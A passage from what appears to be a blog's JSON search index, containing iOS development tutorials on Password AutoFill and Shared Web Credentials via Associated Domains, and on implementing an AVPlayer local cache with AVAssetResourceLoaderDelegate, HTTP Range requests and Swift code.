-&gt; BoolFurther Reading iOS Cross-Platform Account and Password Integration to Enhance Login Experience iOS Deferred Deep Link Implementation (Swift) References What‚Äôs new in Universal Links Apple Documentation If you have any questions or feedback, feel free to contact me . üîó Copy link to share! üç∫ Buy me a beer on PayPal This post was originally published on Medium (View original post), and automatically converted and synced by ZMediumToMarkdown. Improve this page on Github." }, { "title": "iOS Cross-Platform Account IntegrationÔΩúEnhance Login Experience Beyond Sign in with Apple", "url": "/posts/zrealm-dev/ios-cross-platform-account-integration-enhance-login-experience-beyond-sign-in-with-apple-948ed34efa09/", "categories": "ZRealm Dev.", "tags": "english, ai-translation, ios, ios-app-development, password-security, web-credential, sign-in-with-apple", "date": "2021-02-02 22:13:50 +0800", "snippet": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!iOS Cross-Platform Account and Password Integration to Enhance Login Experienc...", "content": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!iOS Cross-Platform Account and Password Integration to Enhance Login ExperienceOther Features Worth Adding Besides Sign in with ApplePhoto by Dan NelsonFeaturesThe most common issue in services with both a website and an app is that users who have registered and saved their passwords on the website are forced to re-enter their credentials when opening the app after installation. This feature automatically fills the existing account and password stored on the phone into the app linked to the website, speeding up the login process.Result ImageNo fuss, here is the final effect image; at first glance, you might think it‚Äôs the iOS ‚â• 11 Password AutoFill feature. But please look closely‚Äîthe keyboard does not pop up, and I clicked the ‚ÄúSelect Saved Password‚Äù button to bring up the account and password selection window.Since Password AutoFill was mentioned, let me tease a bit first by introducing Password AutoFill and how to set it up!Password AutoFillSupport: iOS ‚â• 11Now that it‚Äôs already iOS 14, this feature is very common and nothing special; on the app‚Äôs login page for account and password, when the keyboard pops up for input, you can quickly select the website version‚Äôs account and password, and after selecting, it will automatically fill in for a fast login!So how do the APP and Web recognize each other?Associated Domains! We specify Associated Domains in the APP and upload the apple-app-site-association file on the website, allowing both sides to recognize each other.1. In the project settings under ‚ÄúSigning &amp; Capabilities‚Äù -&gt; top left ‚Äú+ Capabilities‚Äù -&gt; ‚ÄúAssociated Domains‚ÄùAdd webcredentials:yourwebsite.com (e.g., webcredentials:google.com).2. Log in to the Apple Developer ConsoleRecord the Team ID in the Membership tab.3. Go to ‚ÄúCertificates, Identifiers &amp; Profiles‚Äù -&gt; ‚ÄúIdentifiers‚Äù -&gt; find your project -&gt; enable the ‚ÄúAssociated Domains‚Äù featureApp Setup Complete!4. Web Website SettingsCreate a file named ‚Äúapple-app-site-association‚Äù (no extension), edit it with a text editor, and enter the following content:{ \"webcredentials\": { \"apps\": [ \"TeamID.BundleId\" ] }}Replace TeamID.BundleId with your project settings (e.g., TeamID = ABCD, BundleID = li.zhgchg.demoapp =&gt; ABCD.li.zhgchg.demoapp)Upload this file to the website‚Äôs root directory or /.well-known directory. If your webcredentials site domain is set to google.com, then the file must be accessible at google.com/apple-app-site-association or google.com/.well-known/apple-app-site-association.Supplement: SubdomainsExcerpt from the official documentation: if they are subdomains, they must all be listed in Associated Domains.Web setup completed!Supplement: applinksHere, it was found that if a universal link applinks is set, adding the webcredentials part is not necessary for it to work; however, let‚Äôs follow the documentation to avoid potential issues in the future.Back to the programFor the code part, we only need to set the TextField to:usernameTextField.textContentType = .usernamepasswordTextField.textContentType = .passwordIf you are newly registered, the password confirmation field can use:repeatPasswordTextField.textContentType = .newPasswordAt this point, after rebuilding and running the app, saved password options for the same website will appear above the keyboard when entering the account.Done!Not appearing?The autofill password feature might be turned off (it is off by default in the simulator). Please go to ‚ÄúSettings‚Äù -&gt; ‚ÄúPasswords‚Äù -&gt; ‚ÄúAutofill Passwords‚Äù -&gt; turn on ‚ÄúAutofill Passwords‚Äù.Or if the site has no existing password, you can also go to ‚ÄúSettings‚Äù -&gt; ‚ÄúPasswords‚Äù -&gt; top right corner ‚Äú+‚Äù -&gt; Add new.Getting StartedAfter introducing the appetizer, Password AutoFill, let‚Äôs move on to the main topic of this article: how to achieve the effect shown in the image.Shared Web CredentialsStarting from iOS 8.0, although few apps used it before, this API could be used to integrate website usernames and passwords for users to quickly select even before Password AutoFill was introduced.Shared Web Credentials can not only read usernames and passwords but also add new credentials, modify existing ones, and delete them.Settings ‚ö†Ô∏è You still need to set up Associated Domains, just like the previously mentioned Password AutoFill settings. So it can be said that this is an enhanced version of the Password AutoFill feature!!Because you need to set up the environment required for Password AutoFill before using this ‚Äúadvanced‚Äù feature.ReadReading using the SecRequestSharedWebCredential method:SecRequestSharedWebCredential(nil, nil) { (credentials, error) in guard error == nil else { DispatchQueue.main.async { //alert error } return } guard CFArrayGetCount(credentials) &gt; 0, let dict = unsafeBitCast(CFArrayGetValueAtIndex(credentials, 0), to: CFDictionary.self) as? Dictionary&lt;String, String&gt;, let account = dict[kSecAttrAccount as String], let password = dict[kSecSharedPassword as String] else { DispatchQueue.main.async { //alert error } return } DispatchQueue.main.async { //fill account,password to textfield }}SecRequestSharedWebCredential(fqdn, account, completionHandler) fqdn If there are multiple webcredentials domains, you can specify one or use null to specify none. account Specifies the account to query; use null to specify none Rendered image. (You may notice it differs from the initial rendered image) ‚ö†Ô∏è This reading method has been marked Deprecated since iOS 14! ‚ö†Ô∏è This reading method has been marked Deprecated since iOS 14! ‚ö†Ô∏è This reading method has been marked Deprecated since iOS 14! \"Use ASAuthorizationController to create an ASAuthorizationPasswordRequest (AuthenticationServices framework)\"This method only applies to iOS 8 ~ iOS 14. For iOS 13 and later, you can use the same Sign in with Apple API ‚Äî AuthenticationServices.AuthenticationServices Reading MethodSupport iOS ‚â• 13import AuthenticationServicesclass ViewController: UIViewController { override func viewDidLoad() { super.viewDidLoad() //... let request: ASAuthorizationPasswordRequest = ASAuthorizationPasswordProvider().createRequest() let controller = ASAuthorizationController(authorizationRequests: [request]) controller.delegate = self controller.performRequests() //... }}extension ViewController: ASAuthorizationControllerDelegate { func authorizationController(controller: ASAuthorizationController, didCompleteWithAuthorization authorization: ASAuthorization) { if let credential = authorization.credential as? ASPasswordCredential { // fill credential.user, credential.password to textfield } // else if as? ASAuthorizationAppleIDCredential... sign in with apple } func authorizationController(controller: ASAuthorizationController, didCompleteWithError error: Error) { // alert error }}The mockup shows that the new approach integrates better with Sign in with Apple in both the process and display. ‚ö†Ô∏è This sign-in cannot replace Sign in with Apple (they are two different things).Write account and password to ‚ÄúPassword‚ÄùOnly the reading part is deprecated; adding, deleting, and editing still work as before.Additions, deletions, and edits are performed using SecAddSharedWebCredential.SecAddSharedWebCredential(domain as CFString, account as CFString, password as CFString?) { (error) in DispatchQueue.main.async { guard error == nil else { // show error alert return } // show success alert }}SecAddSharedWebCredential(fqdn, account, password, completionHandler) fqdn can be freely assigned to any domain to be stored and does not have to be in webcredentials account specifies the account to add, modify, or delete To delete data, set password to nil. Processing logic: account exists &amp; password provided = update password account exists &amp; password is nil = remove account and password from domain account does not exist &amp; password provided = add account and password to domain ‚ö†Ô∏è It also does not allow secret background modifications. Every time a change is made, a prompt will notify the user, and the user must click ‚ÄúUpdate Password‚Äù to confirm the change.Password GeneratorThe last small feature, a password generator.Use SecCreateSharedWebCredentialPassword() to perform the operation.let password = SecCreateSharedWebCredentialPassword() as String? ?? \"\"The generated password consists of uppercase and lowercase letters, numbers, and uses ‚Äú-‚Äú as a separator (e.g., Jpn-4t2-gaF-dYk).Complete Test Project DownloadMinor DrawbacksIf you use third-party password managers (e.g., 1Password, LastPass), you might notice that while the keyboard‚Äôs Password AutoFill supports display and input, they do not appear in AuthenticationServices or SecRequestSharedWebCredential. It is unclear if this requirement can be met.EndThank you all for reading, and thanks to saiday and StreetVoice for letting me know about this feature XD.XCode ‚â• 12.5 simulators now support screen recording with the handy option to save as GIF!Press ‚ÄúCommand‚Äù + ‚ÄúR‚Äù on the simulator to start recording. Click the red dot to stop recording; then right-click the preview thumbnail that slides out from the bottom right corner -&gt; ‚ÄúSave as Animated GIF‚Äù to save it as a GIF and paste it directly into the article!If you have any questions or feedback, feel free to contact me. üîó Copy link to share! üç∫ Buy me a beer on PayPal This post was originally published on Medium (View original post), and automatically converted and synced by ZMediumToMarkdown. Improve this page on Github." }, { "title": "AVPlayer Local Cache ImplementationÔΩúMaster AVAssetResourceLoaderDelegate for Smooth Playback", "url": "/posts/zrealm-dev/avplayer-local-cache-implementation-master-avassetresourceloaderdelegate-for-smooth-playback-6ce488898003/", "categories": "ZRealm Dev.", "tags": "english, ai-translation, ios, ios-app-development, cache, avplayer, music-player-app", "date": "2021-01-31 18:41:42 +0800", "snippet": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!Complete Guide to Implementing Local Cache with AVPlayerAVPlayer/AVQueuePlayer...", "content": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!Complete Guide to Implementing Local Cache with AVPlayerAVPlayer/AVQueuePlayer with AVURLAsset Implementation of AVAssetResourceLoaderDelegatePhoto by Tyler Lastovich[2023/03/12] UpdateI have open-sourced my previous implementation. Feel free to use it if you need. Custom cache strategies can use PINCache or others‚Ä¶ Externally, just call the make AVAsset factory with the URL, and the AVAsset will support caching. Using Combine to implement data flow strategy Wrote some tests IntroductionSince the last article ‚ÄúiOS HLS Cache Implementation Exploration Journey‚Äù more than half a year ago, the team has still wanted to implement a streaming cache feature because it greatly impacts costs. We are a music streaming platform, and if the same song is fully downloaded every time it plays, it consumes a lot of data for both us and users without unlimited plans. Although music files are only a few MBs at most, small amounts add up to significant costs!Additionally, since Android has already implemented a feature for caching while streaming, previous comparisons showed significant cost savings. After launching on Android, data usage was noticeably reduced; similarly, iOS, with its larger user base, should see even better data saving results.Based on the experience from the previous article, if we continue to use HLS (.m3u8/.ts) to achieve the goal, things will become very complicated or even impossible; instead, we fallback to using mp3 files, which allows direct implementation with AVAssetResourceLoaderDelegate.Goal Played music will generate a local cache backup. Check if there is a local cache before playing music; if available, do not request the file from the server again. Cache strategy can be set; when the total capacity limit is exceeded, the oldest cache files will be deleted. Do not interfere with the original AVPlayer playback mechanism(The fastest way would be to use URLSession to download the mp3 first and then feed it to AVPlayer, but this loses the original streaming feature that plays as it downloads, causing users to wait longer and consume more data) Background Knowledge (1) ‚Äî HTTP/1.1 Range Requests and Connection Keep-AliveHTTP/1.1 Range RequestsFirst, we need to understand how data is requested from the server when playing videos or music. Generally, video and audio files are large, so it‚Äôs impossible to wait until the entire file is downloaded before starting playback. Commonly, data is fetched as playback progresses, and as long as the data for the currently playing segment is available, playback can continue.The way to achieve this function is by using HTTP/1.1 Range to return only the specified byte range of data. For example, specifying 0‚Äì100 will return only the 100 bytes of data from 0 to 100. Using this method, data can be retrieved in segments sequentially and then combined into a complete file. This method can also be applied to file download resume functionality.How to Apply?We will first use HEAD to check the Response Header to understand whether the server supports Range requests, the total length of the resource, and the file type:curl -i -X HEAD http://zhgchg.li/music.mp3Using HEAD, we can obtain the following information from the Response Header: Accept-Ranges: bytes means the server supports range requests.If the response does not include this value or shows Accept-Ranges: none, it means range requests are not supported. Content-Length: The total length of the resource; we need to know the total length to segment the data. Content-Type: File type information required by AVPlayer during playback. Sometimes we also use GET Range: bytes=0‚Äì1, meaning we request data in the 0‚Äì1 range, but we actually don‚Äôt care about the content in 0‚Äì1; we just want to check the Response Header information. The native AVPlayer uses GET to do this, so this article follows the same approach. It is recommended to use HEAD to check. This method is more accurate, and if the server does not support the Range feature, using GET will force the full file to download.curl -i -X GET http://zhgchg.li/music.mp3 -H \"Range: bytes=0‚Äì1\"Using GET, we can obtain the following information from the Response Header: Accept-Ranges: bytes means the server supports Range requests.If the response lacks this value or shows Accept-Ranges: none, it means it is not supported. Content-Range: bytes 0‚Äì1/total resource length The number after ‚Äú/‚Äù indicates the total length of the resource. We need to know the total length to request data in segments. Content-Type: File type information required by AVPlayer during playback. Once you know the server supports Range requests, you can send segmented range requests:curl -i -X GET http://zhgchg.li/music.mp3 -H \"Range: bytes=0‚Äì100\"The server will return 206 Partial Content:Content-Range: bytes 0-100/total lengthContent-Length: 100...(binary content)At this point, we have obtained data for the range 0‚Äì100 and can continue sending new requests to get ranges 100‚Äì200, 200‚Äì300, and so on until completion.If the requested Range exceeds the total length of the resource, it will return 416 Range Not Satisfiable.Additionally, to get the complete file data, you can either request Range 0-total length or simply use 0- :curl -i -X GET http://zhgchg.li/music.mp3 -H \"Range: bytes=0‚Äì\"You can also request multiple Range data and set conditions in the same request, but we don‚Äôt need to use them. For details, please refer to this.Connection Keep-AliveHTTP 1.1 is enabled by default. This feature allows real-time access to downloaded data, for example, a 5 MB file can be received in chunks of 16 KB, 16 KB, 16 KB‚Ä¶ without waiting for the entire 5 MB to finish downloading.Connection: Keep-AliveWhat if the server does not support Range or Keep-Alive? No need to do so much; just use URLSession to download the mp3 file and pass it to the player directly‚Ä¶ but this is not the result we want. We can ask the backend to help modify the server settings.Background Knowledge (2) ‚Äî How Does AVPlayer Natively Handle AVURLAsset Resources?When we use AVURLAsset init with URL resource and assign it to AVPlayer/AVQueuePlayer to start playback, as mentioned above, it will first use GET Range 0‚Äì1 to check if Range requests are supported, the total resource length, and the file type.After obtaining the file information, a second request will be made to fetch data from 0 to the total length. ‚ö†Ô∏è AVPlayer requests data from 0 to the total length and uses the downloaded data chunks (16 kb, 16 kb, 16 kb‚Ä¶) to decide when enough data is available, then it sends a Cancel to stop the network request (so it usually does not download the entire file unless the file is very small). Only after continuing playback will data be requested forward through Range. (This part differs from what I expected before; I anticipated requests like 0‚Äì100, 100‚Äì200, etc.)* AVPlayer Request Example:1. GET Range 0-1 =&gt; Response: Total length 150000 / public.mp3 / true2. GET 0-150000...3. 16 kb receive4. 16 kb receive...5. cancel() // current offset is 7006. Continue playing7. GET 700-150000...8. 16 kb receive9. 16 kb receive...10. cancel() // current offset is 150011. Continue playing12. GET 1500-150000...13. 16 kb receive14. 16 kb receive...16. If seek to...500017. cancel(12.) // current offset is 200018. GET 5000-150000...19. 16 kb receive20. 16 kb receive...... ‚ö†Ô∏è For iOS ‚â§12, it first sends a few shorter requests to test (?), then sends the request for the full length; iOS ‚â• 13 directly sends the request for the full length.There is an additional pitfall: when observing how resources are fetched, I used the mitmproxy tool to sniff the traffic. It showed an error because it only displays the response after the entire content is received, instead of showing chunks or persistent connection downloads. This startled me! I thought iOS was so inefficient that it always downloads the whole file at once! Next time I use a tool, I need to stay a bit skeptical. OrzWhen to Initiate Cancel The second request mentioned earlier requests resources from 0 to the total length. After receiving enough data, it will send a Cancel to stop the request. Seek will first send a Cancel request to abort the previous one. ‚ö†Ô∏è Switching to the next item in AVQueuePlayer or changing the playback resource in AVPlayer does not trigger a Cancel request for the previous item.AVQueue Pre-bufferingActually, it also calls the Resource Loader for processing, but the data range it requests is smaller.ImplementationWith the above background knowledge, let‚Äôs look at the principle and method of implementing AVPlayer local cache functionality.This is the previously mentioned AVAssetResourceLoaderDelegate interface, which allows us to implement a Resource Loader for an Asset ourselves.Resource Loader is basically a worker. Whether the player needs file information or file data, and the range it covers, it‚Äôs the one that tells us. We just follow its instructions. I saw an example where one Resource Loader serves all AVURLAssets, which I think is wrong. Each Resource Loader should serve one AVURLAsset and follow the AVURLAsset‚Äôs lifecycle since it inherently belongs to the AVURLAsset. One Resource Loader servicing all AVURLAssets on an AVQueuePlayer becomes very complex and hard to manage.Timing to Enter the Custom Resource LoaderNote that implementing your own Resource Loader does not guarantee it will be used. It will only be invoked when the system cannot recognize or handle the resource.So before providing the URL resource to AVURLAsset, we must first change the scheme to our custom scheme, not http/https or other system-handled schemes.http://zhgchg.li/music.mp3 =&gt; cacheable://zhgchg.li/music.mp3AVAssetResourceLoaderDelegateOnly two methods need to be implemented: func resourceLoader( _ resourceLoader: AVAssetResourceLoader, shouldWaitForLoadingOfRequestedResource loadingRequest : AVAssetResourceLoadingRequest) -&gt; Bool :This method asks if we can handle this resource. Return true if yes, return false if we do not handle it (unsupported URL).We can extract from loadingRequest what is being requested (whether it‚Äôs the first request for file info or a data request, and if it‚Äôs a data request, the range requested). After knowing the request, we initiate the request ourselves to fetch the data. At this point, we can decide whether to start a URLSession or return Data from local storage.You can also perform data encryption and decryption here to protect the original data. func resourceLoader( _ resourceLoader: AVAssetResourceLoader, didCancel loadingRequest : AVAssetResourceLoadingRequest) :As mentioned earlier, when initiating Cancel timing and starting Cancel‚Ä¶We can cancel the ongoing URLSession request here.Local Cache Implementation MethodsFor caching, I directly use PINCache to handle cache tasks, avoiding issues like cache read-write deadlocks and implementing cache clearing with LRU strategy ourselves. Ô∏èÔ∏è‚ö†Ô∏èÔ∏èÔ∏èÔ∏èÔ∏èÔ∏èÔ∏èÔ∏èÔ∏èÔ∏èÔ∏èOOM Warning! Because this is for caching music files around 10 MB in size, PINCache can be used as the local cache tool; if it were for videos, this method wouldn‚Äôt work (loading several GBs of data into memory at once).For this requirement, you can refer to the expert‚Äôs approach, using FileHandle‚Äôs seek and read/write features for handling.Start Working!No fuss, here is the complete project:AssetDataLocal cache data objects implement NSCoding because PINCache relies on archivedData methods for encoding and decoding.import Foundationimport CryptoKitclass AssetDataContentInformation: NSObject, NSCoding { @objc var contentLength: Int64 = 0 @objc var contentType: String = \"\" @objc var isByteRangeAccessSupported: Bool = false func encode(with coder: NSCoder) { coder.encode(self.contentLength, forKey: #keyPath(AssetDataContentInformation.contentLength)) coder.encode(self.contentType, forKey: #keyPath(AssetDataContentInformation.contentType)) coder.encode(self.isByteRangeAccessSupported, forKey: #keyPath(AssetDataContentInformation.isByteRangeAccessSupported)) } override init() { super.init() } required init?(coder: NSCoder) { super.init() self.contentLength = coder.decodeInt64(forKey: #keyPath(AssetDataContentInformation.contentLength)) self.contentType = coder.decodeObject(forKey: #keyPath(AssetDataContentInformation.contentType)) as? String ?? \"\" self.isByteRangeAccessSupported = coder.decodeObject(forKey: #keyPath(AssetDataContentInformation.isByteRangeAccessSupported)) as? Bool ?? false }}class AssetData: NSObject, NSCoding { @objc var contentInformation: AssetDataContentInformation = AssetDataContentInformation() @objc var mediaData: Data = Data() override init() { super.init() } func encode(with coder: NSCoder) { coder.encode(self.contentInformation, forKey: #keyPath(AssetData.contentInformation)) coder.encode(self.mediaData, forKey: #keyPath(AssetData.mediaData)) } required init?(coder: NSCoder) { super.init() self.contentInformation = coder.decodeObject(forKey: #keyPath(AssetData.contentInformation)) as? AssetDataContentInformation ?? AssetDataContentInformation() self.mediaData = coder.decodeObject(forKey: #keyPath(AssetData.mediaData)) as? Data ?? Data() }}AssetData stores: contentInformation : AssetDataContentInformationAssetDataContentInformation :Stores whether Range requests are supported (isByteRangeAccessSupported), total resource length (contentLength), and file type (contentType) mediaData : Raw audio Data (Large files here may cause OOM) PINCacheAssetDataManagerEncapsulate the logic for storing and retrieving data in PINCache.import PINCacheimport Foundationprotocol AssetDataManager: NSObject { func retrieveAssetData() -&gt; AssetData? func saveContentInformation(_ contentInformation: AssetDataContentInformation) func saveDownloadedData(_ data: Data, offset: Int) func mergeDownloadedDataIfIsContinuted(from: Data, with: Data, offset: Int) -&gt; Data?}extension AssetDataManager { func mergeDownloadedDataIfIsContinuted(from: Data, with: Data, offset: Int) -&gt; Data? { if offset &lt;= from.count &amp;&amp; (offset + with.count) &gt; from.count { let start = from.count - offset var data = from data.append(with.subdata(in: start..&lt;with.count)) return data } return nil }}//class PINCacheAssetDataManager: NSObject, AssetDataManager { static let Cache: PINCache = PINCache(name: \"ResourceLoader\") let cacheKey: String init(cacheKey: String) { self.cacheKey = cacheKey super.init() } func saveContentInformation(_ contentInformation: AssetDataContentInformation) { let assetData = AssetData() assetData.contentInformation = contentInformation PINCacheAssetDataManager.Cache.setObjectAsync(assetData, forKey: cacheKey, completion: nil) } func saveDownloadedData(_ data: Data, offset: Int) { guard let assetData = self.retrieveAssetData() else { return } if let mediaData = self.mergeDownloadedDataIfIsContinuted(from: assetData.mediaData, with: data, offset: offset) { assetData.mediaData = mediaData PINCacheAssetDataManager.Cache.setObjectAsync(assetData, forKey: cacheKey, completion: nil) } } func retrieveAssetData() -&gt; AssetData? { guard let assetData = PINCacheAssetDataManager.Cache.object(forKey: cacheKey) as? AssetData else { return nil } return assetData }}Here, the Protocol is extracted separately because other storage methods may replace PINCache in the future. Therefore, other programs rely on the Protocol rather than the Class instance when using it. ‚ö†Ô∏è mergeDownloadedDataIfIsContinuted This method is extremely important.For linear playback, you can simply keep appending new data to the cached data. However, real scenarios are more complex. A user might play the range 0‚Äì100, then directly seek to the range 200‚Äì500. How to merge the existing 0‚Äì100 data with the new 200‚Äì500 data becomes a major issue. ‚ö†Ô∏èData merging issues can cause terrible playback glitches‚Ä¶.The answer here is, we do not handle non-continuous data; since our project only involves audio files, which are just a few MB (‚â§ 10MB), we decided not to implement this to save development costs. I only handle merging continuous data (for example, if we currently have 0~100 and new data is 75~200, after merging it becomes 0~200; if the new data is 150~200, I ignore it and do not merge).If non-continuous merging is considered, besides using other methods for storage (to identify missing parts), the Request must also be able to query which segments require network requests and which are retrieved locally. Implementing this scenario will be very complex.Image source: iOS AVPlayer ËßÜÈ¢ëÁºìÂ≠òÁöÑËÆæËÆ°‰∏éÂÆûÁé∞CachingAVURLAssetAVURLAsset weakly holds the ResourceLoader Delegate, so it is recommended to create a custom AVURLAsset class that inherits from AVURLAsset. Inside, create, assign, and hold the ResourceLoader to tie it to the AVURLAsset‚Äôs lifecycle. You can also store the original URL, CacheKey, and other information.class CachingAVURLAsset: AVURLAsset { static let customScheme = \"cacheable\" let originalURL: URL private var _resourceLoader: ResourceLoader? var cacheKey: String { return self.url.lastPathComponent } static func isSchemeSupport(_ url: URL) -&gt; Bool { guard let components = URLComponents(url: url, resolvingAgainstBaseURL: false) else { return false } return [\"http\", \"https\"].contains(components.scheme) } override init(url URL: URL, options: [String: Any]? = nil) { self.originalURL = URL guard var components = URLComponents(url: URL, resolvingAgainstBaseURL: false) else { super.init(url: URL, options: options) return } components.scheme = CachingAVURLAsset.customScheme guard let url = components.url else { super.init(url: URL, options: options) return } super.init(url: url, options: options) let resourceLoader = ResourceLoader(asset: self) self.resourceLoader.setDelegate(resourceLoader, queue: resourceLoader.loaderQueue) self._resourceLoader = resourceLoader }}Usage:if CachingAVURLAsset.isSchemeSupport(url) { let asset = CachingAVURLAsset(url: url) let avplayer = AVPlayer(asset) avplayer.play()}The function isSchemeSupport() is used to determine whether the URL supports attaching our Resource Loader (excluding file://).originalURL stores the original resource URL.cacheKey stores the Cache Key for this resource, here we directly use the file name as the Cache Key.Adjust the cacheKey according to real scenarios. If the file name is not hashed and may cause duplicates, it is recommended to hash it first as the key to avoid collisions. If hashing the entire URL as the key, also be aware of whether the URL may change (e.g., when using a CDN).Hash can use md5‚Ä¶sha‚Ä¶, iOS ‚â• 13 can directly use Apple‚Äôs CryptoKit, for others, just check Github!ResourceLoaderRequestimport Foundationimport CoreServicesprotocol ResourceLoaderRequestDelegate: AnyObject { func dataRequestDidReceive(_ resourceLoaderRequest: ResourceLoaderRequest, _ data: Data) func dataRequestDidComplete(_ resourceLoaderRequest: ResourceLoaderRequest, _ error: Error?, _ downloadedData: Data) func contentInformationDidComplete(_ resourceLoaderRequest: ResourceLoaderRequest, _ result: Result&lt;AssetDataContentInformation, Error&gt;)}class ResourceLoaderRequest: NSObject, URLSessionDataDelegate { struct RequestRange { var start: Int64 var end: RequestRangeEnd enum RequestRangeEnd { case requestTo(Int64) case requestToEnd } } enum RequestType { case contentInformation case dataRequest } struct ResponseUnExpectedError: Error { } private let loaderQueue: DispatchQueue let originalURL: URL let type: RequestType private var session: URLSession? private var dataTask: URLSessionDataTask? private var assetDataManager: AssetDataManager? private(set) var requestRange: RequestRange? private(set) var response: URLResponse? private(set) var downloadedData: Data = Data() private(set) var isCancelled: Bool = false { didSet { if isCancelled { self.dataTask?.cancel() self.session?.invalidateAndCancel() } } } private(set) var isFinished: Bool = false { didSet { if isFinished { self.session?.finishTasksAndInvalidate() } } } weak var delegate: ResourceLoaderRequestDelegate? init(originalURL: URL, type: RequestType, loaderQueue: DispatchQueue, assetDataManager: AssetDataManager?) { self.originalURL = originalURL self.type = type self.loaderQueue = loaderQueue self.assetDataManager = assetDataManager super.init() } func start(requestRange: RequestRange) { guard isCancelled == false, isFinished == false else { return } self.loaderQueue.async { [weak self] in guard let self = self else { return } var request = URLRequest(url: self.originalURL) self.requestRange = requestRange let start = String(requestRange.start) let end: String switch requestRange.end { case .requestTo(let rangeEnd): end = String(rangeEnd) case .requestToEnd: end = \"\" } let rangeHeader = \"bytes=\\(start)-\\(end)\" request.setValue(rangeHeader, forHTTPHeaderField: \"Range\") let session = URLSession(configuration: .default, delegate: self, delegateQueue: nil) self.session = session let dataTask = session.dataTask(with: request) self.dataTask = dataTask dataTask.resume() } } func cancel() { self.isCancelled = true } func urlSession(_ session: URLSession, dataTask: URLSessionDataTask, didReceive data: Data) { guard self.type == .dataRequest else { return } self.loaderQueue.async { self.delegate?.dataRequestDidReceive(self, data) self.downloadedData.append(data) } } func urlSession(_ session: URLSession, dataTask: URLSessionDataTask, didReceive response: URLResponse, completionHandler: @escaping (URLSession.ResponseDisposition) -&gt; Void) { self.response = response completionHandler(.allow) } func urlSession(_ session: URLSession, task: URLSessionTask, didCompleteWithError error: Error?) { self.isFinished = true self.loaderQueue.async { if self.type == .contentInformation { guard error == nil, let response = self.response as? HTTPURLResponse else { let responseError = error ?? ResponseUnExpectedError() self.delegate?.contentInformationDidComplete(self, .failure(responseError)) return } let contentInformation = AssetDataContentInformation() if let rangeString = response.allHeaderFields[\"Content-Range\"] as? String, let bytesString = rangeString.split(separator: \"/\").map({String($0)}).last, let bytes = Int64(bytesString) { contentInformation.contentLength = bytes } if let mimeType = response.mimeType, let contentType = UTTypeCreatePreferredIdentifierForTag(kUTTagClassMIMEType, mimeType as CFString, nil)?.takeRetainedValue() { contentInformation.contentType = contentType as String } if let value = response.allHeaderFields[\"Accept-Ranges\"] as? String, value == \"bytes\" { contentInformation.isByteRangeAccessSupported = true } else { contentInformation.isByteRangeAccessSupported = false } self.assetDataManager?.saveContentInformation(contentInformation) self.delegate?.contentInformationDidComplete(self, .success(contentInformation)) } else { if let offset = self.requestRange?.start, self.downloadedData.count &gt; 0 { self.assetDataManager?.saveDownloadedData(self.downloadedData, offset: Int(offset)) } self.delegate?.dataRequestDidComplete(self, error, self.downloadedData) } } }}The encapsulation of Remote Request mainly handles data requests initiated by the ResourceLoader service.RequestType: Used to distinguish whether this request is the first time requesting file information (contentInformation) or requesting data (dataRequest)RequestRange: Request the Range; the end can be specified (requestTo(Int64)) or set to the entire range (requestToEnd).File information can be obtained from:func urlSession(_ session: URLSession, dataTask: URLSessionDataTask, didReceive response: URLResponse, completionHandler: @escaping (URLSession.ResponseDisposition) -&gt; Void)Obtain the Response Header here. Also, note that if you want to use HEAD requests, this method won‚Äôt work; you need to use other approaches. isByteRangeAccessSupported: Check if the Response Header contains Accept-Ranges == bytes contentType: The file type information required by the player. The format is a Uniform Type Identifier, not audio/mpeg, but written as public.mp3 contentLength: Check the Content-Range in the Response Header: bytes 0‚Äì1/ total resource length ‚ö†Ô∏è Note that the server‚Äôs format casing may vary; it is not always written as Accept-Ranges/Content-Range. Some servers use lowercase accept-ranges, Accept-ranges‚Ä¶Supplement: If case sensitivity needs to be considered, you can write an HTTPURLResponse Extensionimport CoreServicesextension HTTPURLResponse { func parseContentLengthFromContentRange() -&gt; Int64? { let contentRangeKeys: [String] = [ \"Content-Range\", \"content-range\", \"Content-range\", \"content-Range\" ] var rangeString: String? for key in contentRangeKeys { if let value = self.allHeaderFields[key] as? String { rangeString = value break } } guard let rangeString = rangeString, let contentLengthString = rangeString.split(separator: \"/\").map({String($0)}).last, let contentLength = Int64(contentLengthString) else { return nil } return contentLength } func parseAcceptRanges() -&gt; Bool? { let contentRangeKeys: [String] = [ \"Accept-Ranges\", \"accept-ranges\", \"Accept-ranges\", \"accept-Ranges\" ] var rangeString: String? for key in contentRangeKeys { if let value = self.allHeaderFields[key] as? String { rangeString = value break } } guard let rangeString = rangeString else { return nil } return rangeString == \"bytes\" \\|\\| rangeString == \"Bytes\" } func mimeTypeUTI() -&gt; String? { guard let mimeType = self.mimeType, let contentType = UTTypeCreatePreferredIdentifierForTag(kUTTagClassMIMEType, mimeType as CFString, nil)?.takeRetainedValue() else { return nil } return contentType as String }}Usage: contentLength = response.parseContentLengthFromContentRange() # Parse the content length from the Content-Range header isByteRangeAccessSupported = response.parseAcceptRanges() # Check if byte-range access is supported contentType = response.mimeTypeUTI() func urlSession(_ session: URLSession, dataTask: URLSessionDataTask, didReceive data: Data)As mentioned in the preamble, the downloaded data is obtained in real time, so 